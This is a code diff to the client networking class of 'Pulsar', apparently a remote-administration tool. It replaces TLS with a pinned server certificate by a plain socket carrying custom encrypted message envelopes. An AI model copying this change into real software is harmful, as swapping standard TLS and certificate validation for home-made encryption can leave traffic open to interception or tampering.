@@ -7,9 +7,7 @@ using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Net;
-using System.Net.Security;
 using System.Net.Sockets;
-using System.Security.Authentication;
 using System.Security.Cryptography;
 using System.Security.Cryptography.X509Certificates;
 using System.Threading;
@@ -134,12 +132,17 @@ namespace Pulsar.Client.Networking
         /// <summary>
         /// The stream used for communication.
         /// </summary>
-        private SslStream _stream;
+        private Stream _stream;
 
         /// <summary>
         /// The server certificate.
         /// </summary>
         private readonly X509Certificate2 _serverCertificate;
+
+        /// <summary>
+        /// Indicates whether secure envelopes should be enforced for all traffic.
+        /// </summary>
+        protected bool EncryptTraffic { get; set; }
 
         /// <summary>
         /// A list of all the connected proxy clients that this client holds.
@@ -179,6 +182,11 @@ namespace Pulsar.Client.Networking
             _readBuffer = new byte[HEADER_SIZE];
             _readOffset = 0;
             _readLength = HEADER_SIZE;
+            EncryptTraffic = SecureMessageEnvelopeHelper.CanUse(_serverCertificate);
+            if (!EncryptTraffic)
+            {
+                throw new InvalidOperationException("A valid server certificate is required for secure communication.");
+            }
         }
 
         /// <summary>
@@ -200,8 +208,7 @@ namespace Pulsar.Client.Networking
 
                 if (handle.Connected)
                 {
-                    _stream = new SslStream(new NetworkStream(handle, true), false, ValidateServerCertificate);
-                    _stream.AuthenticateAsClient(ip.ToString(), null, SslProtocols.Tls12, false);
+                    _stream = new NetworkStream(handle, true);
                     _stream.BeginRead(_readBuffer, _readOffset, _readBuffer.Length, AsyncReceive, null);
                     OnClientState(true);
                 }
@@ -215,25 +222,6 @@ namespace Pulsar.Client.Networking
                 handle?.Dispose();
                 OnClientFail(ex);
             }
-        }
-
-        /// <summary>
-        /// Validates the server certificate by comparing it with the included server certificate.
-        /// </summary>
-        /// <param name="sender">The sender of the callback.</param>
-        /// <param name="certificate">The server certificate to validate.</param>
-        /// <param name="chain">The X.509 chain.</param>
-        /// <param name="sslPolicyErrors">The SSL policy errors.</param>
-        /// <returns>Returns <value>true</value> when the validation was successful, otherwise <value>false</value>.</returns>
-        private bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
-        {
-#if DEBUG
-            // for debugging don't validate server certificate
-            return true;
-#else
-            // compare the received server certificate with the included server certificate to validate we are connected to the correct server
-            return _serverCertificate.Equals(certificate);
-#endif
         }
 
         private void AsyncReceive(IAsyncResult result)
@@ -271,6 +259,7 @@ namespace Pulsar.Client.Networking
                             try
                             {
                                 var message = PulsarMessagePackSerializer.Deserialize(_readBuffer);
+                                message = ProcessIncomingMessage(message);
                                 OnClientRead(message, _readBuffer.Length);
                             }
                             finally
@@ -355,6 +344,51 @@ namespace Pulsar.Client.Networking
                 while (_sendBuffers.TryDequeue(out _)) ;
             }
         }
+        
+        private IMessage PrepareMessageForSend(IMessage message)
+        {
+            if (message == null)
+            {
+                return null;
+            }
+
+            if (message is SecureMessageEnvelope)
+            {
+                return message;
+            }
+
+            if (!EncryptTraffic)
+            {
+                return message;
+            }
+
+            if (!SecureMessageEnvelopeHelper.CanUse(_serverCertificate))
+            {
+                throw new InvalidOperationException("Secure transport is enabled but no certificate is available.");
+            }
+
+            return SecureMessageEnvelopeHelper.Wrap(message, _serverCertificate);
+        }
+        
+        private IMessage ProcessIncomingMessage(IMessage message)
+        {
+            if (message is SecureMessageEnvelope secureEnvelope)
+            {
+                if (!SecureMessageEnvelopeHelper.CanUse(_serverCertificate))
+                {
+                    throw new InvalidOperationException("Received a secure envelope but no certificate is available for decryption.");
+                }
+
+                return SecureMessageEnvelopeHelper.Unwrap(secureEnvelope, _serverCertificate);
+            }
+
+            if (EncryptTraffic)
+            {
+                throw new InvalidOperationException($"Received unexpected plaintext message of type {message?.GetType().Name} while encryption is enforced.");
+            }
+
+            return message;
+        }
 
         /// <summary>
         /// Sends a message to the connected server and blocks until sent.
@@ -383,7 +417,13 @@ namespace Pulsar.Client.Networking
 
                 try
                 {
-                    var payload = PulsarMessagePackSerializer.Serialize(message);
+                    var prepared = PrepareMessageForSend(message);
+                    if (prepared == null)
+                    {
+                        return;
+                    }
+
+                    var payload = PulsarMessagePackSerializer.Serialize(prepared);
                     int totalLength = HEADER_SIZE + payload.Length;
 
                     byte[] buffer = ArrayPool<byte>.Shared.Rent(totalLength);
